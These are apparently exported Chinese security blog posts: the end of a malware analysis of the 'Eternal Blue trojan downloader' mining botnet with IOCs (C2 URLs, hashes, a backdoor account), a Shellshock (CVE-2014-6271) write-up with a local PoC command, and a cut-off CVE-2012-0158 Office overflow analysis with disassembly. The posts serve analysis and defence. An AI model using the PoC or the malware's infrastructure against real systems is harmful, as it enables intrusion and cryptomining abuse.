<li>会在对应条件满足情况下对传播模块进行下载，下载的传播模块有Windows下的传播模块if.bin和Linux下的传播模块kr.bin，内置传播模块信息如下，用于验证 ：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162458.png"></p>
<ol start="2">
<li>依据系统版本不同，下载对应的32/64位挖矿程序me3.exe/m6.bin(经检测32位暂时没有下载)。另外对于存在独立显卡(N卡/A卡)的主机，会下载显卡挖矿脚本m6g.bin同时进行挖矿，内置挖矿脚本信息如下，用于验证：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162525.png"></p>
<ol start="3">
<li>如果主机有N卡，则同时会下载XMRig的CUDA插件到%AppData%\temp\nvdg.dat，用于支持显卡挖矿：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162542.png"></p>
<ol start="4">
<li>检测当前机器Outlook存在状态，据此下载钓鱼邮件相关的攻击组件if_mail.bin并执行，该组件后面进行分析说明：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162603.png"></p>
<ol start="5">
<li>依据temp目录下的日志文件kk4kk.log存在状态，来进行ode.bin脚本的下载执行：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162622.png"></p>
<p>​    ode.bin主要完成了对20.dat的下载，下载IP为167.99.154.202，命名为4到8位随机字符组成字串.exe。然后创建同名计划任务定时启动样本，或者通过计划任务定时启动tt.vbs脚本，再通过脚本启动样本来完成持久化操作：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162638.png"></p>
<p>​    </p>
<p>​    该样本(ef3a4697773f84850fe1a086db8edfe0)和最开始所述的未加签名的python传播模块类似，包含了永恒之蓝攻击、MSSQL爆破攻击、IPC$爆破攻击、SMB爆破攻击等，猜测其可能是为了对越来越复杂的传播模块进行攻击组件的切割，为其后续的某些行为做准备。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162711.png"></p>
<h2 id="02-无文件攻击新添加组件说明"><a href="#02-无文件攻击新添加组件说明" class="headerlink" title="02 无文件攻击新添加组件说明"></a>02 无文件攻击新添加组件说明</h2><p>​    “永恒之蓝木马下载器”系列木马的更新是一个频繁且长久的过程，要想完整的对更新链进行详细描述，怕是能讲三天三夜。所以这里我们长话短说，重点着墨于其关键更新的节点，对后续添加的攻击组件及其行为进行分析说明。</p>
<ol>
<li><p>Lnk漏洞攻击添加:</p>
<p>紧接上述的无文件挖矿模块被添加之后，在19年7月19日，检测到攻击组件又被进行了扩展，添加了Lnk漏洞(CVE-2017-8464)相关的攻击.</p>
<p>首先会检测可移动设备和网络共享盘存在状态，然后向检测到的目标盘目录中释放木马文件blue3.bin、blue6.bin、readme.js，以及带漏洞的Lnk文件:</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162834.png"></p>
<p>​    释放木马及Lnk文件部分代码如下图所示，其释放的Lnk文件，文件名为D ~K开头+任意一个释放的木马文件文件名，用于执行同目录下的木马文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162901.png"></p>
<p>​    CVE-2017-8464漏洞可怕之处在于其只要打开了Lnk文件所在目录就已经进行了恶意操作的执行，其会去下载usb.jsp进行后续攻击。</p>
<ol start="2">
<li>在19年10月9日检测到攻击组件对于RDP远程执行漏洞(CVE-2019-0708)的添加，完成了对于该漏洞的检测上报，依旧利用该漏洞进行横向传播，攻击成功后远程执行命令下载rdp.jsp到目标机中直接执行。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162916.png"></p>
<ol start="3">
<li>20年4月开始，攻击组件中加入了钓鱼邮件的传播方式，邮件附件doc中包含了office远程代码执行漏洞(CVE-2017-8570），邮件内容和Covid-19(新冠病毒)相关，关键的攻击代码在if_mail.bin脚本中，会通过当前用户的Outlook邮箱进行邮件的发送。其中部分邮件相关信息如下：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162935.png"></p>
<p>​    当被攻击用户运行doc文档后，会触发漏洞下载执行后续脚本mail.jsp。</p>
<p>​    此时也增加了一个小组件BypasUAC，其在脚本7p.jsp中，部分代码如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162950.png"></p>
<ol start="4">
<li>20年5月21号检测到SMBGhost漏洞(CVE-2020-0796)相关的组件添加，以及SSH爆破攻击相关组件添加，在后续对它们进行了利用，攻击成功后也会远程下载对应的后续脚本smbh.jsp和ssh.jsp并执行。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163008.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163018.png"></p>
<ol start="5">
<li><p>另外还有部分攻击组件包括Linux攻击，从20年6月10左右开始新增，也将其攻击代码列举如下：</p>
<p>IPC$攻击，攻击完成后远程下载对应脚本ipc.jsp并执行：</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163034.png"></p>
<p>​    Redis未授权访问漏洞攻击，攻击完成后远程下载对应脚本red.jsp并执行</p>
<p><img src="C:\Users\hskul\AppData\Roaming\Typora\typora-user-images\image-20211029163046827.png" alt="image-20211029163046827"></p>
<p>​    Yarn未授权访问漏洞，攻击Linux服务器集群，完成后运行挖矿木马：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029163056.png"></p>
<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>​    本文粗略分析了”永恒之蓝木马下载器”各个阶段所使用的攻击手段。虽然文章结束了，但是该挖矿病毒的演化还在继续。</p>
<p>​    从上文的分析来看，该病毒作者采用了各种常见的攻击方式来传播该病毒，导致此病毒有极强的传播能力。这也是为何本文一开始说该病毒在内网的流行度可以作为内网安全性的一个指标。</p>
<p>​    “永恒之蓝木马下载器”病毒另一个需要关注的点在于其模块化的攻击手段，作者甚至可以将较新的漏洞嵌入到病毒的整个传播流程中。由此可见该病毒的整个架构已经较为成熟，安全运维人员在处置最新的漏洞时弱反应较慢，此病毒很容易在内网中形成传播的趋势。</p>
<h1 id="5-安全建议"><a href="#5-安全建议" class="headerlink" title="5. 安全建议"></a>5. 安全建议</h1><ol>
<li>安装杀毒软件对病毒进行预防和查杀。</li>
<li>关闭不必要的端口，包括但不限于135、139、445、3389等。</li>
<li>修改默认密码，使用强度较高的密码，做到定期更新，一机一码。</li>
<li>对于相关的漏洞，如永恒之蓝系列漏洞、CVE-2017-8464 、CVE-2017-8570、CVE-2019-0708、CVE-2020-0796。</li>
<li>提高员工的安全意识，做到定期科普。</li>
</ol>
<h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><p><strong>MD5</strong>：</p>
<p>def0e980d7c2a59b52d0c644a6e40763</p>
<p>f79cb9d2893b254cc75dfb7f3e454a69</p>
<p>74e2a43b2b7c6e258b3a3fc2516c1235</p>
<p>2e9710a4b9cba3cd11e977af87570e3b</p>
<p>def0e980d7c2a59b52d0c644a6e40763</p>
<p>95adf923ba32cc5004277867181680c8</p>
<p>31ce6662be59ca4c01c1730bc7150f19</p>
<p>e05827e44d487d1782a32386123193ef</p>
<p>55f0dd8c306db9fc8b9e45705cd66598</p>
<p>c17cdee1afdc272a46b1cf25c1f44dcc</p>
<p>24c4149468926bedcb41f50ac88b40f3</p>
<p>4ec29049ac81521c37dad2da6754d6a3</p>
<p>888dc1ca4b18a3d424498244acf81f7d</p>
<p>3162e619f8eb49f4dd6b48cb09075e10</p>
<p>94838EDD7470271386153D3B89FE6A6C    </p>
<p>e561003b347f391eec44759de1da5ebf</p>
<p>ff75c064248579f4bdabec6d6dba89d6</p>
<p>2ae7f2f4f0b114ed074ba191acf1665a</p>
<p>ef3a4697773f84850fe1a086db8edfe0</p>
<p><strong>URL</strong>：</p>
<p>hxxp://pull[.]update[.]ackng[.]com/</p>
<p>hxxp://dl[.]haqo[.]net/</p>
<p>hxxp://i[.]haqo.net/i.png</p>
<p>hxxp://p[.]abbny.com/im.png</p>
<p>hxxp://v[.]beahh.com/v+$env:USERDOMAIN</p>
<p>hxxp://w[.]beahh.com/page.html?p%COMPUTERNAME%</p>
<p>hxxp://v[.]beahh.com/ipc?low1</p>
<p>hxxp://info[.]haqo.net/e.png?</p>
<p>hxxp://info[.]beahh.com/e.png?</p>
<p>hxxp://info[.]abbny.com/e.png?</p>
<p>hxxp://d[.]beahh.com/update.png?p=11</p>
<p>hxxp://172[.]104.177.202/new.json?11</p>
<p>hxxp://172[.]104.177.202/new.dat?11</p>
<p>hxxp://v[.]y6h.net/g?</p>
<p>hxxp://down[.]beahh.com/new.dat?allv5</p>
<p>hxxp://down[.]beahh.com/mn.dat?allv5</p>
<p>hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=</p>
<p>hxxp://t.zz3r0[.]com/a.jsp?</p>
<p>hxxp://t.zer9g[.].com/a.jsp?</p>
<p>hxxp://t.amynx[.]com/a.jsp?</p>
<p>hxxp://t.amynx[.]com /ms.jsp?</p>
<p>hxxp://t.amynx[.]com /mso.jsp?</p>
<p>hxxp://t.amynx[.]com /7p.php?</p>
<p>hxxp://t.amynx[.]com /usb.php?</p>
<p>hxxp://t.amynx[.]com /ln/core.png?</p>
<p>hxxp://t.amynx[.]com /smgh.jsp?</p>
<p>hxxp://t.amynx[.]com /rdp.jsp</p>
<p>hxxp://t.amynx[.]com/ipc.jsp</p>
<p>hxxp://d.ackng[.]com/if.bin?</p>
<p>hxxp://d.ackng[.]com/nvd.zip</p>
<p>hxxp://d.ackng[.]com/if_mail.bin?</p>
<p><strong>Domain</strong>：</p>
<p>pull[.]update[.]ackng[.]com</p>
<p>dl[.]haqo[.]net</p>
<p>i[.]haqo.net    </p>
<p>p[.]abbny.com</p>
<p>v[.]beahh.com</p>
<p>w[.]beahh.com</p>
<p>info[.]haqo.net</p>
<p>info[.]beahh.com</p>
<p>info[.]abbny.com</p>
<p>d[.]beahh.com</p>
<p>down[.]beahh.com</p>
<p>p[.]beahh.com</p>
<p>t[.]zz3r0.com</p>
<p>t[.]zer9g.com</p>
<p>t[.]amynx.com</p>
<p>t[.]ackng.com</p>
<p><strong>文件</strong>：</p>
<p>c:\windows\temp\updater.exe</p>
<p>c:\windows\system32\svhost.exe</p>
<p>c:\windows\system32\drivers\svchost.exe</p>
<p>c:\windows\system32\drivers\taskmgr.exe</p>
<p>c:\windows\system32\wmiex.exe</p>
<p>c:\windows\temp\svchost</p>
<p>c:\windows\temp\m2.ps1</p>
<p>c:\windows\temp\mkatz.ini</p>
<p><strong>注</strong>：在64位系统中c:\windows\system32替换为c\windows\SysWOW64</p>
<p><strong>计划任务</strong>：</p>
<p>svhost、server、Ddrivers、WebServers、Credentials、DnsScan、Bluetooths、00-00-00-00-00-00(MAC地址命名)、blackball、Rtsa2、Rtsa1、Rtsa、bluetea</p>
<p><strong>重点关注账户：</strong></p>
<p>Name：k8h3d</p>
<p>Password：k8d3j9SjfS7</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>样本分析</tag>
        <tag>永恒之蓝</tag>
      </tags>
  </entry>
  <entry>
    <title>shellsock漏洞(CVE-2014-6271)分析</title>
    <url>/2021/09/13/%E6%BC%8F%E6%B4%9E/shellsock%E6%BC%8F%E6%B4%9E(CVE-2014-6271)%20/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​    在刷pwnable.kr的题目shellshock时，碰到了这个bash的老漏洞，这里我也对其分析一下，做个记录。</p>
<p>​    shellshock破壳漏洞，是一个高危的漏。漏洞原理简单来说就是子进程bash在获得父bash进程传递的shell环境变量时，对函数定义的变量解析除了问题，导致了任意代码被执行。</p>
<p>​    该漏洞可以分为本地利用和远程利用两种，其远程利用危害性极强，攻击者可以利用该漏洞精心伪造数据，通过网络请求到一台利用bash脚本来处理用户请求的网站上，来直接或间接的触发一个bash脚本，这样就可以远程执行而已代码了。</p>
<p>​    经测试，从bash1.14 到4.3都存在这样的漏洞。   </p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>​    我是在ubuntu中玩耍的，先确定自己bash版本，新的ubuntu自带的bash版本都是4.3以上的，不存在shellshock漏洞，所以需要自己手动安装低版本的bash：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210913105601.png"></p>
<p>​     从<a href="https://www.gnu.org/software/bash/bash.html">gun.org/software/bash</a>选择一个国内的镜像源，然后把bash-4.1下载并进行安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/gnu/bash//bash-4.1.tar.gz</span><br><span class="line">tar -zxvf bash-4.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bash-4.1/</span><br><span class="line">sudo ./configure --prefix=/usr/<span class="built_in">local</span>/bash-4.1 <span class="comment">#这里如果时新环境，先装好gcc，sudo apt install gcc</span></span><br><span class="line">sudo make  make install</span><br></pre></td></tr></table></figure>

<p>​    执行上述步骤后，在/usr/local/bash-4.1/下成功安装到新的bash，可以验证查看一下，成功安装到了指定版本的bash：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210910171905.png"></p>
<p>​    为了省事，这里就不再弄PATH变量等操作了，直接在bin/下使用新安装的bash进行漏洞测试即可。</p>
<p>​    针对这个shellshock漏洞，一个广为流传的本地测试poc命令如下，我们稍作修改，然后测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> bash -c <span class="string">&quot;echo this is a test&quot;</span></span><br><span class="line"><span class="comment">#这里针对性修改一下，来做测试，在usr/local/bash-4.1/bin下执行poc</span></span><br><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> ./bash -c <span class="string">&quot;echo this is a test&quot;</span></span><br></pre></td></tr></table></figure>

<p>​    成功输出vulnerable，漏洞复成功：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210910174405.png"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​    首先需要了解一下shell中的变量类型和变量的作用域以及bash父子进程对于shell变量的使用，shell变量以及其对应的作用域可以分为如下三种：</p>
<ul>
<li>局部变量(local var)：只能在函数内部使用</li>
<li>全局变量(global var)：在<strong>当前shell进程</strong>中可以使用</li>
<li>环境变量(env var)：可以让当前shell进程的子进程使用</li>
</ul>
<p>​    对于这三种变量依次分析一下，局部变量没什么好说的，主要是全局变量和环境变量这里简单说明一下。全局变量只在当前shell程序中有效，对于其它shell进程和子进程都无效，比如下面，定义一个变量a=910，在当前bash shell中可以输出，但是新开一个bash子进程就访问不到。</p>
<p>​    创建全局变量的shell进程称为父进程(这里用bash)，父进程中新创建的进程就为子进程，要想子进程也访问到父bash进程的全局变量，那么就需要用<code>export</code>将全局变量导出，被导出的变量就被称为<strong>环境变量</strong>。当shell产生子进程时，它会继承父进程的环境变量为自己所用(<strong>自动加载</strong>)，也就是说父进程的环境变量传递给了子进程，当然环境变量还可以继续向下传递给孙进程。</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshockimage-20210913185624618.png"></p>
<p>​    bash中可以将shell函数也导出为环境变量，这有两种方式：1.直接定义函数并export -f（-f为参数，必须设置）；2.通过环境变量值来定义函数</p>
<ol>
<li>直接定义函数并导出比较好理解，用法如下：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210913191107.png"></p>
<ol start="2">
<li><p>而shellshock漏洞利用的正好是第二种方法，通过bash对环境变量值的转换来获得。bash中，当某个环境变量的值为字符串且以<code>&quot;() &#123;&quot;</code>的格式开头(小括号和大括号间必有空格)书写时，那么该环境变量在被子bash进程加载时会被转换为一个shell函数，而不是当作一个shell变量，示例如下：</p>
<p><strong>注：</strong>上述通过环境变量来定义函数的方式，被称为bash的自动导入机制(自动导入函数到当前bash的子进程)，应为出现了shellshock漏洞，所以现在发行版的linux都会默认关了bash的自动导入机制，想要测试该机制还得用刚才配置的bash低版本来测试。</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshockimage-20210914111044982.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914111013.png"></p>
<p>​    Shellshock漏洞就是出现在bash的自动导入机制中，如果在<code>() &#123;&#125;</code>完整函数变量尾部的花括号后加上一个“小尾巴”(shell 命令)，由于bash中解析逻辑存在漏洞它会在转换过程中，把”小尾巴“的内容也进行执行:<br><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914150218.png"></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>​    总结一下，shellshock漏洞主要出现在，子bash进程导入父bash进程的环境变量时，对函数型环境变量的值解析出了问题，导致额外的代码被执行。</p>
<p>​    该漏洞存在于bash源代码的variables.c文件中，拿上面bash4.1的对应文件进行分析，包含漏洞的代码在<code>initialize_shell_variables()</code>函数中：</p>
<ol>
<li>首先进入函数，第一步主要操作就是遍历整个env列表，对每一个有效环境变量进行操作，解析完成后，name-存储环境变量名，string-存储环境变量值，char_index-存储环境变量名长度：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914160711.png"></p>
<ol start="2">
<li>判断有效的环境变量是否匹配<code>&#39;() &#123;&#39;</code>也就是是否为导出函数(另外两个判关于特权模式的判断，需要保证real uid和effective id相同，一般情况下都是相同的)，若是自动导出函数，就直接申请一块内存空间，然后把string(环境变量值)不做任何拷贝到空间中然后交由<code>parse_and_execute()</code>函数执行</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210914161318.png"></p>
<p>​    <code>parse_and_execute()</code>函数原型如下，传递给函数的所有内容都会被当作普通bash命令执行，所以导致了漏洞的产生。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Parse and execute the commands in STRING.  Returns whatever</span></span><br><span class="line"><span class="comment">   execute_command () returns.  This frees STRING.  FLAGS is a</span></span><br><span class="line"><span class="comment">   flags word; look in common.h for the possible values.  Actions</span></span><br><span class="line"><span class="comment">   are:</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NONINT) -&gt; interactive = 0;</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_INTERACT) -&gt; interactive = 1;</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NOHIST) -&gt; call bash_history_disable ()</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_NOFREE) -&gt; don&#x27;t free STRING when finished</span></span><br><span class="line"><span class="comment">    (flags &amp; SEVAL_RESETLINE) -&gt; reset line_number to 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_and_execute (<span class="built_in">string</span>, from_file, flags)</span><br><span class="line">     <span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *from_file;</span><br><span class="line">     <span class="keyword">int</span> flags;</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>linux漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Office 栈溢出漏洞(CVE-2012-0158)分析</title>
    <url>/2020/09/14/%E6%BC%8F%E6%B4%9E/Office%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CVE-2012-0158)/</url>
    <content><![CDATA[<h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><ul>
<li>CVE-2012-0158 Microsoft Office MSCOMCTL.ocx栈溢出漏洞是Office的经典漏洞，作为Office的入门漏洞，这个漏洞很有学习价值</li>
<li>漏洞成因是由于Microsoft Windows的MSCOMCTL.OCX插件中的<code>MSCOMCTL.TreeView</code>、<code>MSCOMCTL.LstView2</code>、<code>MSCOMCTL.TreeView2</code>、<code>MSCOMCTL.ListView</code>控件中存在内存拷贝时检查条件错误而造成的栈的缓冲区溢出，导致可被用于执行任意代码。</li>
</ul>
<h1 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h1><ul>
<li>使用了如下的分析环境:</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>使用的环境</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Winodw 7专业版(32位)</td>
</tr>
<tr>
<td>虚拟机</td>
<td>VMware</td>
</tr>
<tr>
<td>调试器</td>
<td>OllyDbg/WinDbg</td>
</tr>
<tr>
<td>反汇编器</td>
<td>IDA Pro</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Office 2003 SP3</td>
</tr>
<tr>
<td>Office格式分析工具</td>
<td>OfficeMalScanner</td>
</tr>
</tbody></table>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><ul>
<li><p>安装Office 2003 sp3，软件资源链接: <a href="https://pan.baidu.com/s/10XQ29z7rLDIDxY_2t9mi1w">https://pan.baidu.com/s/10XQ29z7rLDIDxY_2t9mi1w</a> 提取码: 700w</p>
</li>
<li><p>运行PoC，PoC获取可以通过如下的网站：</p>
<ul>
<li><a href="https://www.exploit-db.com/%EF%BC%9A%E5%9B%BD%E5%A4%96%E7%9F%A5%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BA%93%EF%BC%8C%E5%86%85%E5%90%AB%E4%B8%B0%E5%AF%8C%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90">https://www.exploit-db.com/：国外知名漏洞利用库，内含丰富的学习资源</a></li>
<li><a href="https://www.securityfocus.com/%EF%BC%9A%E5%9B%BD%E5%A4%96%E8%91%97%E5%90%8D%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E5%BA%93%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%85%AC%E5%91%8A%E4%BF%A1%E6%81%AF%E5%92%8C%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0%E5%92%8CPoC%E4%BB%A3%E7%A0%81">https://www.securityfocus.com/：国外著名漏洞信息库，有很多漏洞公告信息和一些漏洞的分析文章和PoC代码</a></li>
</ul>
<p>PoC运行后效果如下，显示了如下的异常信息，异常偏移为0x41414141，说明漏洞利用成功:</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581918766506.png"></p>
<h2 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h2><ul>
<li>使用OD进行附加分析，需要先把OD中StringOD和异常选项中忽略的异常全部恢复</li>
</ul>
<h3 id="分析思路："><a href="#分析思路：" class="headerlink" title="分析思路："></a>分析思路：</h3><ol>
<li><p>打开Word，使用OD附加进程，word进程名称为WINWORD.EXE，然后加载PoC文件，产生异常，此时EIP为0x41414141，符合前面的异常偏移</p>
</li>
<li><p>定位到漏洞触发模块，具体做法是通过堆栈查看当前ESP所在位置，回溯栈上的数据，可以发现最近的返回地址位于一个叫做MSCOMCTL模块中的一个地址0x275C8A0A，在反汇编窗口中查看此地址，具体如图所示：</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581924525665.png"></p>
<ol start="3">
<li>继续向上查看，在找到函数sub_275C89C7入口，在地址0x275C89C7下断，重新运行word并加载PoC，函数成功断下:</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581925338805.png"></p>
<p>​    同时可以查看模块找到MSCOMCTL.OCX模块地址为C:\Windows\System32\MSCOMCTL.OCX，有了模块路径后就可以使用IDA配合OD进行分析，因为这个模块是动态加载的，两者结合分析更棒哦</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581925961115.png"></p>
<p>​    之后对EBP+4也就是函数返回地址下内存写入断点，F9运行，找到对栈进行溢出填充的地方</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581926815050.png"></p>
<p>​    发现成功断在函数sub_275C876D内部，断点位置为0x275C87CB</p>
<ol start="4">
<li>OD函数调用传参和使用IDA中对函数sub_275C876D进行分析：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581928777596.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:275C876D var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:275C876D arg_0           &#x3D; dword ptr  8</span><br><span class="line">.text:275C876D lpMem           &#x3D; dword ptr  0Ch</span><br><span class="line">.text:275C876D dwBytes         &#x3D; dword ptr  10h</span><br><span class="line"></span><br><span class="line">.text:275C876D                 push    ebp</span><br><span class="line">.text:275C876E                 mov     ebp, esp</span><br><span class="line">.text:275C8770                 push    ecx</span><br><span class="line">.text:275C8771                 push    ebx</span><br><span class="line">.text:275C8772                 mov     ebx, [ebp+lpMem]</span><br><span class="line">.text:275C8775                 push    esi</span><br><span class="line">.text:275C8776                 xor     esi, esi</span><br><span class="line">.text:275C8778                 mov     eax, [ebx]</span><br><span class="line">.text:275C877A                 push    edi</span><br><span class="line">.text:275C877B                 push    esi</span><br><span class="line">.text:275C877C                 lea     ecx, [ebp+var_4]</span><br><span class="line">.text:275C877F                 push    4</span><br><span class="line">.text:275C8781                 push    ecx</span><br><span class="line">.text:275C8782                 push    ebx</span><br><span class="line">.text:275C8783                 call    dword ptr [eax+0Ch]</span><br><span class="line">.text:275C8786                 cmp     eax, esi</span><br><span class="line">.text:275C8788                 jl      short loc_275C8802</span><br><span class="line">.text:275C878A                 mov     edi, [ebp+dwBytes]</span><br><span class="line">.text:275C878D                 cmp     [ebp+var_4], edi</span><br><span class="line">.text:275C8790                 jnz     loc_275D3F93</span><br><span class="line">.text:275C8796                 push    edi             ; dwBytes</span><br><span class="line">.text:275C8797                 push    esi             ; dwFlags</span><br><span class="line">.text:275C8798                 push    hHeap           ; hHeap</span><br><span class="line">.text:275C879E                 call    ds:HeapAlloc</span><br><span class="line">.text:275C87A4                 cmp     eax, esi</span><br><span class="line">.text:275C87A6                 mov     [ebp+lpMem], eax</span><br><span class="line">.text:275C87A9                 jz      loc_275D3F9D</span><br><span class="line">.text:275C87AF           